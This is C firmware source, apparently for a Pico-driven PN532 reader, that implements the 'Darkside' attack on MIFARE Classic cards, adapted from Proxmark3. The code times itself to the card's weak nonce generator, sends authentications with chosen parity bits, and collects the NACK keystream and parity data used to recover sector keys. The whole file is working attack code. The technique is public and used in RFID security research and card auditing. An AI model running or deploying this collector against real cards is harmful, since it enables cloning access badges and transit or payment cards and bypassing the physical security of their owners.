/*
 * SPDX-License-Identifier: GPL-3.0-or-later
 * Upstream file notices for the PM3-derived Darkside collector:
 * Copyright (C) Jonathan Westhues, Nov 2006
 * Copyright (C) Gerhard de Koning Gans - May 2008
 * Copyright (C) Proxmark3 contributors. See upstream AUTHORS.md for details.
 *
 * ReaderMifare adapted for bounded PN532 direct RF.
 * Provenance notices updated on 2026-09-27.
 * See docs/licenses/NOTICE.md and LICENSE.
 */

#include "cards/mifare/reader/mifare_reader.h"
#include "cards/mifare/reader/mifare_recovery.h"
#include "common/endian.h"
#include "phy/nfca/pcd/nfca_recovery_clock.h"
#include "phy/pcd/reader_rf_trace.h"

#include "hardware/sync.h"
#include "pico/stdlib.h"

#include <string.h>

#define DARKSIDE_SEQUENCE_TICKS 65536u
#define DARKSIDE_MAX_CYCLES 1200u
#define DARKSIDE_MAX_DURATION_US 120000000u

static struct
{
    bool active;
    bool selected;
    bool have_par_low;
    uint8_t block;
    bool key_b;
    uint8_t nr_ar[8];
    uint8_t par;
    uint8_t par_low;
    uint8_t variation;
    uint16_t cycles;
    uint16_t sync_tries;
    uint16_t unexpected_random;
    uint16_t resyncs;
    uint32_t started_us;
    uint32_t sync_time;
    uint32_t nonce;
    uint32_t attacked_nonce;
    int32_t period;
    int32_t catch_up;
    int32_t last_catch_up;
    darkside_observation_t observation;
} darkside;

void mifare_darkside_reset(void)
{
    memset(&darkside, 0, sizeof(darkside));
}

static int32_t darkside_dist_nt(uint32_t nt1, uint32_t nt2)
{
    if (nt1 == nt2)
    {
        return 0;
    }
    uint32_t s1 = __builtin_bswap32(nt1);
    uint32_t s2 = __builtin_bswap32(nt2);
    const uint32_t target1 = s1;
    const uint32_t target2 = s2;
    for (uint16_t i = 1; i < 32768; i++)
    {
        const uint32_t fb1 =
            (s1 >> 16u) ^ (s1 >> 18u) ^ (s1 >> 19u) ^ (s1 >> 21u);
        s1 = (s1 >> 1u) | ((fb1 & 1u) << 31u);
        if (s1 == target2)
        {
            return (int32_t)i;
        }

        const uint32_t fb2 =
            (s2 >> 16u) ^ (s2 >> 18u) ^ (s2 >> 19u) ^ (s2 >> 21u);
        s2 = (s2 >> 1u) | ((fb2 & 1u) << 31u);
        if (s2 == target1)
        {
            return -(int32_t)i;
        }
    }
    return -99999;
}

static inline uint8_t darkside_reflect8(uint8_t b)
{
    b = (uint8_t)(((b & 0xF0u) >> 4u) | ((b & 0x0Fu) << 4u));
    b = (uint8_t)(((b & 0xCCu) >> 2u) | ((b & 0x33u) << 2u));
    b = (uint8_t)(((b & 0xAAu) >> 1u) | ((b & 0x55u) << 1u));
    return b;
}

nfc_status_t
nfca_mifare_darkside_start(uint8_t block, bool key_b, uint8_t variant)
{
    if (!mifare_recovery_prepare())
    {
        return NFC_BUSY;
    }
    if (!mifare_recovery_valid_block(block) || variant > 31u ||
        mifare_recovery_tag()->uid_size_bytes == NFCA_UID_TRIPLE_BYTES)
    {
        return NFC_INVALID_ARGUMENT;
    }
    /* Only a complete set on the same target qualifies reuse. Stop and RF
     * failures clear this context. Reacquire Nt after any intervening AUTH;
     * period and the first three challenge parity bits remain target-specific.
     */
    const bool reuse = !darkside.active && darkside.have_par_low &&
                       darkside.observation.outcome == DARKSIDE_COMPLETE &&
                       darkside.block == block && darkside.key_b == key_b &&
                       variant != 0u;
    const int32_t period =
        reuse ? darkside.period : (int32_t)DARKSIDE_SEQUENCE_TICKS;
    const uint8_t par_low = reuse ? darkside.par_low : 0u;
    mifare_darkside_reset();
    READER_RF_TRACE_RESET();
    darkside.active = true;
    darkside.block = block;
    darkside.key_b = key_b;
    darkside.nr_ar[3] = variant;
    darkside.period = period;
    darkside.par_low = par_low;
    darkside.par = par_low;
    darkside.have_par_low = reuse;
    darkside.sync_time = nfca_recovery_clock_now();
    darkside.started_us = time_us_32();
    return NFC_OK;
}

static nfc_status_t finish(darkside_outcome_t outcome,
                           darkside_observation_t *result)
{
    const nfca_tag_t *tag = mifare_recovery_tag();
    darkside.active = false;
    darkside.observation.outcome = outcome;
    darkside.observation.uid = read_be32(&tag->uid[tag->uid_size_bytes - 4u]);
    darkside.observation.nonce = darkside.attacked_nonce;
    darkside.nr_ar[3] &= 0x1fu;
    darkside.observation.reader_nonce = read_be32(darkside.nr_ar);
    darkside.observation.reader_answer = read_be32(&darkside.nr_ar[4]);
    *result = darkside.observation;
    return NFC_OK;
}

nfc_status_t nfca_mifare_darkside_step(darkside_observation_t *result)
{
    if (!mifare_recovery_prepare() || !darkside.active)
    {
        return NFC_BUSY;
    }
    if (result == NULL)
    {
        return NFC_INVALID_ARGUMENT;
    }
    *result = (darkside_observation_t){.outcome = DARKSIDE_MORE};
    if (++darkside.cycles > DARKSIDE_MAX_CYCLES ||
        time_us_32() - darkside.started_us >= DARKSIDE_MAX_DURATION_US)
    {
        return finish(DARKSIDE_EXHAUSTED, result);
    }
    READER_RF_TRACE_STEP(darkside.cycles);
    READER_RF_TRACE_STAGE(READER_TRACE_RESELECT_BEFORE);
    nfc_status_t status =
        darkside.selected ? NFC_OK : mifare_recovery_reselect();
    darkside.selected = false;
    if (status != NFC_OK)
    {
        return status;
    }
    uint16_t elapsed_sequences = 1u;
    darkside.sync_time += (uint32_t)(darkside.period + darkside.catch_up);
    darkside.catch_up = 0;
    while ((int32_t)(darkside.sync_time - nfca_recovery_clock_now()) <
           (int32_t)MIFARE_TX_PREPARE_TICKS)
    {
        if (++elapsed_sequences == UINT16_MAX)
        {
            return finish(DARKSIDE_SYNC_FAILED, result);
        }
        darkside.sync_time += (uint32_t)darkside.period;
    }
    /* Leave interrupts enabled during the long PRNG-period wait. The physical
     * exchange masks them only for final preparation and TX/RX. */
    READER_RF_TRACE_STAGE(READER_TRACE_WAIT_CLOCK);
    const uint32_t wait_started_us = time_us_32();
    while ((int32_t)(darkside.sync_time - nfca_recovery_clock_now()) >
           (int32_t)MIFARE_TX_PREPARE_TICKS)
    {
        if (time_us_32() - wait_started_us > 200000u)
        {
            READER_RF_TRACE_REASON(READER_TRACE_CLOCK_STALLED);
            return NFC_RF_ERROR;
        }
        tight_loop_contents();
    }
    reader_frame_t tx;
    nfca_pcd_response_t rx;
    mifare_reader_command(&tx,
                          darkside.key_b ? MIFARE_CMD_AUTH_B
                                         : MIFARE_CMD_AUTH_A,
                          darkside.block);
    READER_RF_TRACE_STAGE(READER_TRACE_EXCHANGE_FIRST);
    const uint32_t saved = save_and_disable_interrupts();
    status = nfca_reader_transfer_at(&tx, &rx, 32u, darkside.sync_time);
    if (status != NFC_OK || rx.size_bits != 32u || !rx.parity_valid)
    {
        restore_interrupts(saved);
        return status != NFC_OK ? status : NFC_RF_ERROR;
    }
    const uint32_t previous = darkside.nonce;
    darkside.nonce = read_be32(rx.data);
    (void)reader_frame_begin(&tx, 8u);
    tx.byte_parity = true;
    tx.supplied_parity = true;
    memcpy(tx.data, darkside.nr_ar, sizeof(darkside.nr_ar));
    for (uint8_t index = 0u; index < 8u; index++)
    {
        tx.parity[index] = (darkside.par >> (7u - index)) & 1u;
    }
    READER_RF_TRACE_STAGE(READER_TRACE_EXCHANGE_SECOND);
    status = nfca_reader_transfer_at(&tx, &rx, 32u, darkside.sync_time + 2048u);
    restore_interrupts(saved);
    const bool nack = status == NFC_OK && rx.size_bits == 4u;
    const uint8_t keystream = (rx.data[0] & 0x0fu) ^ 0x05u;
    if (status == NFC_OK && rx.size_bits == 32u)
    {
        return finish(DARKSIDE_AUTH_RESPONSE, result);
    }
    if (status != NFC_OK && status != NFC_NO_TAG)
    {
        return status;
    }
    if (status == NFC_OK && !nack)
    {
        return NFC_RF_ERROR;
    }
    READER_RF_TRACE_STAGE(READER_TRACE_RESELECT_AFTER);
    sleep_us(200u);
    status = mifare_recovery_reselect();
    if (status != NFC_OK)
    {
        return status;
    }
    darkside.selected = true;
    /* Restore selection before variable-time distance computation. A NACK
     * belongs to a set only after two scheduled AUTHs returned the same Nt. */
    if (previous != 0u && darkside.attacked_nonce == 0u)
    {
        const int32_t distance = darkside_dist_nt(previous, darkside.nonce);
        if (distance == 0)
        {
            darkside.attacked_nonce = darkside.nonce;
        }
        else
        {
            if (distance == -99999)
            {
                return ++darkside.unexpected_random > 4u
                           ? finish(DARKSIDE_HARD_PRNG, result)
                           : NFC_OK;
            }
            if (++darkside.sync_tries > 64u)
            {
                return finish(DARKSIDE_SYNC_FAILED, result);
            }
            darkside.period -= distance / (int32_t)elapsed_sequences;
            if (darkside.period <= 10)
            {
                darkside.period += DARKSIDE_SEQUENCE_TICKS;
            }
            if (darkside.period > (int32_t)DARKSIDE_SEQUENCE_TICKS * 2)
            {
                darkside.period = DARKSIDE_SEQUENCE_TICKS;
                darkside.sync_time = nfca_recovery_clock_now();
            }
            return NFC_OK;
        }
    }
    if (darkside.attacked_nonce == 0u)
    {
        return NFC_OK;
    }
    if (darkside.nonce != darkside.attacked_nonce)
    {
        const int32_t distance =
            darkside_dist_nt(darkside.attacked_nonce, darkside.nonce);
        if (distance == -99999)
        {
            return NFC_OK;
        }
        darkside.catch_up = -distance / (int32_t)elapsed_sequences;
        darkside.resyncs = darkside.catch_up == darkside.last_catch_up
                               ? darkside.resyncs + 1u
                               : 0u;
        darkside.last_catch_up = darkside.catch_up;
        if (darkside.resyncs >= 3u)
        {
            darkside.period += darkside.catch_up;
            if (darkside.period <= 10)
            {
                darkside.period += DARKSIDE_SEQUENCE_TICKS;
            }
            if (darkside.period > (int32_t)DARKSIDE_SEQUENCE_TICKS * 2)
            {
                darkside.period = DARKSIDE_SEQUENCE_TICKS;
            }
            darkside.last_catch_up = 0;
            darkside.catch_up = 0;
            darkside.resyncs = 0u;
        }
        return NFC_OK;
    }
    if (nack)
    {
        darkside.catch_up = 8;
        if (darkside.variation == 0u)
        {
            darkside.par_low = darkside.par & 0xe0u;
            darkside.have_par_low = true;
        }
        darkside.observation.parity[darkside.variation] =
            darkside_reflect8(darkside.par);
        darkside.observation.keystream[darkside.variation] = keystream;
        if (darkside.variation == 7u)
        {
            return finish(DARKSIDE_COMPLETE, result);
        }
        darkside.variation++;
        darkside.nr_ar[3] =
            (darkside.nr_ar[3] & 0x1fu) | (darkside.variation << 5u);
        darkside.par = darkside.par_low;
    }
    else if (darkside.variation == 0u && !darkside.have_par_low)
    {
        if (++darkside.par == 0u)
        {
            return finish(DARKSIDE_NO_NACK, result);
        }
    }
    else
    {
        darkside.par = ((darkside.par & 0x1fu) + 1u) | darkside.par_low;
        if (darkside.variation == 0u && (darkside.par & 0x1fu) == 0u)
        {
            darkside.have_par_low = false;
            darkside.par = 0u;
        }
    }
    darkside.resyncs = 0u;
    return NFC_OK;
}
